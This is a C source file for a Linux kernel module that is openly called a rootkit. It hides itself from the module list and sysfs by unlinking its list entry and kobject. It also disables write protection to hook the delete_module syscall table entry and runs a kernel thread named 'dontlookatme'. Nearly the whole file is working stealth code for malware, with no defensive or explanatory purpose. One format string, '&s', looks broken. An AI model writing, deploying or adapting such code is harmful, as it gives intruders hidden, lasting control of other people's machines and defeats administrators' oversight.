#include<linux/module.h>
#include<linux/sched.h>
#include<linux/kthread.h>
#include<linux/mutex.h>
#include<linux/list.h>
#include<linux/string.h>
#include<linux/sysfs.h>
#include<linux/moduleparam.h>
#include<linux/dynamic_debug.h>
#include<linux/kobject.h>
#include<linux/slab.h>

#include "hooking.h"

static struct list_head * tmp_head;
static struct kobject tmp_kobj;
static int (*orig_sys_delete_module)(const char * name, int flags);

static int my_delete_module(const char * name, int flags){
	if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
		printk(KERN_INFO "rootkit wants back to it's own kind\n");
		mutex_lock(&module_mutex);
		list_add(&THIS_MODULE->list, tmp_head);
		mutex_unlock(&module_mutex);
	}
	return orig_sys_delete_module(name, flags);
}

static int hiding_thread(void * data){
	mutex_lock(&module_mutex);
	printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
		
	disable_wp();
	orig_sys_delete_module = syscall_table[__NR_delete_module];
	syscall_table[__NR_delete_module] = my_delete_module;
	enable_wp();
	
	tmp_head = THIS_MODULE->list.prev;	
	list_del(&THIS_MODULE->list);
		
	tmp_kobj = THIS_MODULE->mkobj.kobj;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	//TODO save pointers maybe?
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
	
	mutex_unlock(&module_mutex);

	
	return 0;
}

void hide_code(void){
	kthread_run(hiding_thread, NULL, "dontlookatme");
}

void make_module_removable(void){
	THIS_MODULE->mkobj.kobj = tmp_kobj;
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "&s", THIS_MODULE->mkobj.kobj.name);
}

void unhide_code(void) {
	disable_wp();
	syscall_table[__NR_delete_module] = orig_sys_delete_module;
	enable_wp();
}

